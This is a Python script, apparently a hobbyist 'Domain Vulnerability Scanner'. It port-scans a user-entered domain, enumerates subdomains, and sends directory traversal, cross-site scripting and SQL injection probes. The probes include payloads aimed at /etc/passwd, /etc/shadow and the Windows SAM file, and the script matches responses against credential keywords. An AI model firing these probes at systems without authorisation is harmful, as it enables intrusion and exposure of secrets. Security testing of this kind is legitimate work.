# Domain Vulnerability Scanner v2.25
# Author: @smokeshard on Discord
# ======================================================================================================================

import os
import platform
import datetime
import http.client
import re
import socket
import ssl
import urllib.parse
import base64

class DomainScanner:

    # Prepare and sanitise the provided domain as a precaution against most errors and create or update log file.
    
    def __init__ (self, domain):
        if platform.system() == "Linux":
            os.system("clear")
        elif platform.system() == "Windows":
            os.system("cls")
        print("=====\n")
        print(" __                        __         __     __    __                         __     ")
        print("/\ \_                     /\ \      /'__`\  /\ \_ /\ \                       /\ \    ")
        print("\/'__`\    ___ ___     ___\ \ \/'\ /\_\L\ \ \/'__`\ \ \___      __     _ __  \_\ \   ")
        print("/\ \_\_\ /' __` __`\  / __`\ \ , < \/_/_\_<_/\ \_\_\ \  _ `\  /'__`\  /\`'__\/'_` \  ")
        print("\ \____ \/\ \/\ \/\ \/\ \L\ \ \ \\\\`\ /\ \L\ \ \____ \ \ \ \ \/\ \L\.\_\ \ \//\ \L\ \\")
        print(" \/\ \_\ \ \_\ \_\ \_\ \____/\ \_\ \_\ \____/\/\ \_\ \ \_\ \_\ \__/.\_\\\\ \_\\\\ \___,_\\")
        print("  \ `\_ _/\/_/\/_/\/_/\/___/  \/_/\/_/\/___/  \ `\_ _/\/_/\/_/\/__/\/_/ \/_/ \/__,_ /")
        print("   `\_/\_\                                     `\_/\_\                               ")
        print("      \/_/                                        \/_/                               ")
        print("\n")
        domain = re.sub(r'https?://|:[0-9]+', '', domain.lower()).split('/')[0]
        self.domain = domain
        self.scanResult = f"Scan Results for {re.sub(r'[^a-zA-Z0-9-]', '.', domain)}.txt"
        self.LogMessage(f"=====\n\nScan for '{domain}' Started at {datetime.datetime.now()}\n\n=====")

    # Create messages in new or existing log file.
    
    def LogMessage(self, message):
        with open(self.scanResult, "a") as log:
            log.write(message + "\n")
        print(message)

    # Check specific port for specific

    def Port (self, port):
        try:
            address = socket.gethostbyname(self.domain)
            with socket.create_connection((address, port), timeout=2):
                return True
        except (socket.timeout, ConnectionRefusedError, socket.gaierror):
            return False

    # Check for open ports according to dictionary; update as necessary.

    def PortScan(self):
        services = {
            20: 'FTP (Data)', 
            21: 'FTP (Control)', 
            22: 'SSH', 
            23: 'Telnet', 
            25: 'SMTP', 
            53: 'DNS', 
            67: 'DHCP', 
            68: 'DHCP', 
            80: 'HTTP', 
            110: 'POP3', 
            119: 'NNTP', 
            123: 'NTP', 
            143: 'IMAP', 
            161: 'SNMP', 
            162: 'SNMP Trap', 
            194: 'IRC', 
            443: 'HTTPS', 
            445: 'SMB', 
            500: 'ISAKMP', 
            587: 'SMTP (Submission)', 
            993: 'IMAPS', 
            995: 'POP3S', 
            1080: 'SOCKS Proxy', 
            1433: 'MSSQL', 
            1434: 'MSSQL Browser', 
            1521: 'Oracle', 
            3306: 'MySQL', 
            3389: 'RDP', 
            5432: 'PostgreSQL', 
            5900: 'VNC', 
            6379: 'Redis', 
            8080: 'HTTP Proxy', 
            3000: 'Ruby on Rails', 
            3128: 'Squid Proxy', 
            4848: 'GlassFish', 
            5000: 'Flask Default', 
            5985: 'WinRM', 
            5986: 'WinRM SSL', 
            6660: 'IRC', 
            6661: 'IRC', 
            6662: 'IRC', 
            6663: 'IRC', 
            6664: 'IRC', 
            6665: 'IRC', 
            6666: 'IRC', 
            6667: 'IRC', 
            6668: 'IRC', 
            6669: 'IRC', 
            6670: 'IRC', 
            7000: 'Alternate HTTP', 
            7070: 'WebSocket', 
            8000: 'HTTP Alt', 
            8088: 'HTTP Alt', 
            8443: 'HTTPS Alt', 
            9000: 'PHP-FPM', 
            9090: 'Prometheus', 
            27017: 'MongoDB', 
            27018: 'MongoDB', 
            28017: 'MongoDB Web Admin',
        }
        ports = list(services.keys())
        vulnerable = False
        self.LogMessage("\n[+] Performing Port Scan...\n")
        address = socket.gethostbyname(self.domain)
        for port in ports:
            try:
                with socket.create_connection((address, port), timeout=2):
                    service = services.get(port, 'Unknown')
                    self.LogMessage(f"  - Port {port} is OPEN (Service: {service})")
                    vulnerable = True
            except (socket.timeout, ConnectionRefusedError, socket.gaierror):
                pass
        if not vulnerable:
                    self.LogMessage("  - No Open Ports Detected.")

    # Check for any common subdomains for provided domain according to dictionary; update as necessary.

    def DNSEnumeration(self):
        stripped = self.domain.split('.')[-2:]
        stripped = '.'.join(stripped)
        subdomains = [
            "admin",
            "alt",
            "api",
            "app",
            "aspmx",
            "backup",
            "blog",
            "cdn",
            "cms",
            "demo",
            "dev",
            "engage",
            "ftp",
            "hello",
            "help",
            "imap",
            "inbound",
            "kb",
            "landing",
            "learn",
            "m",
            "mail",
            "meet",
            "mx",
            "mxb",
            "pop",
            "pop3",
            "portal",
            "promo",
            "quote",
            "rest",
            "sales",
            "services",
            "shop",
            "smtp",
            "stage",
            "staging",
            "store",
            "support",
            "team",
            "test",
            "trial",
            "try",
            "testasp",
            "testaspnet",
            "testhtml5",
            "testphp",
            "webmail",
            "wiki",
            "www",
        ]
        vulnerable = []
        self.LogMessage("\n[+] Performing DNS Enumeration...\n")
        try:
            MainIPAddress = socket.gethostbyname(self.domain)
            for iteration in subdomains:
                subdomain = f"{iteration}.{self.domain}"
                try:
                    SubIPAddress = socket.gethostbyname(subdomain)
                    if SubIPAddress != MainIPAddress:
                        vulnerable.append(subdomain)
                        self.LogMessage(f"  - Subdomain Detected: {subdomain} ({SubIPAddress})")
                except (socket.gaierror, socket.timeout):
                    pass
        except socket.gaierror as exception:
            self.LogMessage(f"  ! DNS Enumeration Failed: {exception}")
        if not vulnerable:
            self.LogMessage("  - No Common Subdomains Detected.")

    # Check for any directory traversal vulnerabilites according to dictionary; update as necessary.

    def DirectoryTraversal(self):
        insertions = [
            "/admin/config?path={}",
            "/assets/{}",
            "/display?doc={}",
            "/download?file={}",
            "/fetch?url={}",
            "/file?path={}",
            "/get?resource={}",
            "/image?src={}",
            "/include?file={}",
            "/load?document={}",
            "/media/{}",
            "/read?page={}",
            "/render?template={}",
            "/showimage.php?file={}",
            "/static/{}",
            "/upload?name={}",
            "/view?doc={}",
        ]
        payloads = [
            "C:\\Windows\\system32\\config\\SAM",
            "%2e%2e%2f",
            "%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f",
            "%2e%2e/",
            "%252e%252e%252f",
            "..%2f",
            "..%2f..%2f",
            "..%252f",
            "..%c0%af",
            "..../",
            "....//",
            "....//....//",
            ".../",
            "../" "..%2f",
            "../",
            "../../",
            "../../../",
            "../../../../",
            "..//",
            "..//////",
            "..\\", "..\\..\\",
            "..\\../",
            "..\\../",
            "..\\\\../",
            "..\\\\\\\\../",
            "/etc/hosts",
            "/etc/passwd",
            "/etc/shadow",
        ]
        patterns = [
            "administrator",
            "bash",
            "boot.ini",
            "cmd",
            "computername",
            "configuration",
            "config",
            "connection string",
            "connection_string",
            "credential",
            "database",
            "db_pass"
            "db_user",
            "debug",
            "domain",
            "email",
            "environment",
            "env",
            "etc/shadow",
            "hostname",
            "machine_name",
            "mongodb",
            "mssql",
            "mysql",
            "oracle",
            "passwd",
            "password",
            "perl",
            "php",
            "postgres",
            "python",
            "root:",
            "ruby",
            "secret",
            "server_config",
            "settings",
            "shell",
            "sqlite",
            "system32",
            "system_type",
            "token",
            "userid",
            "username",
            "user_id",
            "windows",
            "zsh",
        ]
        vulnerable = False
        self.LogMessage("\n[+] Checking for Directory Traversal...\n")
        for insertion in insertions:
            for payload in payloads:
                try:
                    encoded = urllib.parse.quote(payload)
                    connection = http.client.HTTPConnection(self.domain, timeout=3)
                    connection.request("GET", insertion.format(encoded))
                    response = connection.getresponse()
                    content = response.read().decode(errors="ignore").lower()
                    connection.close()
                    if any(pattern in content for pattern in patterns):
                        self.LogMessage(f"  - Potential Traversal: '{payload}'!")
                        vulnerable = True
                except Exception:
                    pass
        if not vulnerable:
            self.LogMessage("  - No Obvious Directory Traversal Vulnerabilty Detected.")

    # Check for existence of SSL certificate; skip if HTTPS port 443 is closed.

    def SSLCertificate(self):
        if not self.Port(443):
            self.LogMessage("\n[+] Checking SSL Certificate...\n\n  - Port 443 CLOSED. Skipping.")
            return
        vulnerable = True
        self.LogMessage("\n[+] Checking SSL Certificate...\n")
        try:
            context = ssl.create_default_context()
            with context.wrap_socket(socket.socket(), server_hostname=self.domain) as sock:
                sock.connect((self.domain, 443))
                cert = sock.getpeercert()
                self.LogMessage(f"  - SSL Certificate Valid Until: {cert['notAfter']}.")
                vulnerable = False
        except Exception as exception:
            self.LogMessage(f"  ! SSL Check Failed: {exception}")
        if vulnerable:
            self.LogMessage("  - No SSL Certificate Detected!")
    
    # Check HTTP(S) headers for security policies according to dictionary; update as necessary.

    def HTTPHeaders(self):
        security = [
            "Content-Security-Policy",
            "Strict-Transport-Security",
            "X-Frame-Options",
            "X-XSS-Protection",
        ]
        headers = {}
        self.LogMessage("\n[+] Checking Security Headers...\n")
        if not self.Port(443):
            try:
                connection = http.client.HTTPConnection(self.domain, timeout=3)
                connection.request("GET", "/")
                response = connection.getresponse()
                headers = dict(response.getheaders())
                connection.close()
            except Exception as exception:
                self.LogMessage(f"  ! Headers Check Failed: {exception}")
        else:
            try:
                connection = http.client.HTTPSConnection(self.domain, timeout=3)
                connection.request("GET", "/")
                response = connection.getresponse()
                headers = dict(response.getheaders())
                connection.close()
            except Exception as exception:
                self.LogMessage(f"  ! Headers Check Failed: {exception}")
        for header in security:
            if header in headers:
                self.LogMessage(f"  - {header}: {headers[header]}")

    # Check for potential basic cross-site scripting according to dictionary; update as necessary.

    def CrossSiteScripting(self):
        payloads = [
            base64.b64encode("<script>alert('XSS')</script>".encode()).decode(),
            "javascript:alert('XSS')",
            "' onfocus='alert('XSS')",
            "' onmouseover='alert('XSS')",
            "';alert('XSS')//", "\";alert('XSS')//",
            "<img src=x onerror=alert('XSS')>",
            "<SCRIPT>alert('XSS');</SCRIPT>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<svg onload=alert('XSS')>",
            "><script>alert(String.fromCharCode(88,83,83))</script>",
            "\" onmouseover=\"alert('XSS')",
            "\"><iframe src=\"javascript:alert('XSS')\">",
            "\"><video><source onerror=\"alert('XSS')\">",
        ]
        contexts = [
            ("/comment?text={}", "POST"),
            ("/login?username={}&password=test", "POST"),
            ("/search?query={}", "GET"),
            ("/?q={}", "GET"),
        ]
        patterns = [
            "customAlert",
            "document.write",
            "escapeHTML",
            "innerHTML",
            "sanitize",
        ]
        vulnerable = False
        self.LogMessage("\n[+] Checking for Cross-Site Scripting...\n")
        for payload in payloads:
            for template, method in contexts:
                try:
                    encoded = urllib.parse.quote(payload)
                    path = template.format(encoded)
                    connection = http.client.HTTPConnection(self.domain, timeout=3)
                    connection.request(method, path)
                    response = connection.getresponse()
                    content = response.read().decode(errors="ignore")
                    connection.close()
                    if payload in content:
                        self.LogMessage(f"  - Potential Reflected XSS: '{payload}'!")
                        vulnerable = True
                    for pattern in patterns:
                        if pattern in content:
                            self.LogMessage(f"  - XSS Filter Detected: '{pattern}'")
                except (socket.gaierror, ConnectionRefusedError):
                    continue
                except Exception as exception:
                    self.LogMessage(f"  ! XSS Test Failed: {exception}")
        if not vulnerable:
            self.LogMessage("  - No Obvious Cross-Site Scripting Vulnerabilities Detected.")

    # Check for protections regarding cross-site request forgery according to dictionary; update as necessary.

    def CrossSiteRequestForgery(self):
        tokens = [
            "CSRF-Token",
            "csrf_token",
            "X-CSRF-Token",
            "X-XSRF-Token",
        ]
        patterns = [
            r'<input[^>]*name=["\']csrf[^"\']*["\']',
            r'<meta[^>]*name=["\']csrf-token["\']',
        ]
        vulnerable = True
        self.LogMessage("\n[+] Checking for CSRF Protection...\n")
        try:
            connection = http.client.HTTPConnection(self.domain, timeout=3)
            connection.request("GET", "/")
            response = connection.getresponse()
            headers = dict(response.getheaders())
            content = response.read().decode(errors="ignore")
            connection.close()
            for token in tokens:
                if token in headers:
                    vulnerable = False
                    break
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    vulnerable = False
                    break
            if not vulnerable:
                self.LogMessage("  - CSRF Protection Detected!")
            else:
                self.LogMessage("  - No CSRF Protection Detected!")
        except Exception as exception:
            self.LogMessage(f"  ! CSRF Check Failed: {exception}")

    # Check for basic SQL injection techniques according to dictionary; update as necessary.

    def SQLInjection(self):
        payloads = [
            "1 OR 1=1",
            "1' OR '1'='1",
            "admin' --",
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' --", "1' --",
        ]
        patterns = [
            "database error",
            "mysql",
            "oracle",
            "postgresql",
            "sqlite",
            "sql",
            "syntax error",
        ]
        vulnerable = False
        self.LogMessage("\n[+] Checking for SQL Injection...\n")
        for payload in payloads:
            try:
                encoded = urllib.parse.quote(payload)
                connection = http.client.HTTPConnection(self.domain, timeout=3)
                connection.request("GET", f"/?id={encoded}")
                response = connection.getresponse()
                content = response.read().decode(errors="ignore").lower()
                connection.close()
                for pattern in patterns:
                    if pattern in content:
                        self.LogMessage(f"  - Potential SQL Injection: {payload}!")
                        vulnerable = True
                        break
                if response.status == 500:
                    self.LogMessage(f"  - Potential SQL Injection: Server Error with {payload}!")
                    vulnerable = True
            except (socket.gaierror, ConnectionRefusedError):
                continue
            except Exception as exception:
                self.LogMessage(f"  ! SQL Injection Test Failed: {exception}")
        if not vulnerable:
            self.LogMessage("  - No Obvious SQL Injection Vulnerabilities Detected.")

    # Runs the actual scan; comment out methods as necessary.

    def Scan(self):
        methods = [
            self.PortScan,
            self.DNSEnumeration,
            self.DirectoryTraversal,
            self.SSLCertificate,
            self.CrossSiteScripting,
            self.CrossSiteRequestForgery,
            self.SQLInjection,
        ]
        for method in methods:
            method()
        self.LogMessage(f"\n=====\n\nScanning Completed at {datetime.datetime.now()}\n")

if __name__ == "__main__":
    domain = input("\nEnter Domain to Scan: ")
    scanner = DomainScanner(domain)
    scanner.Scan()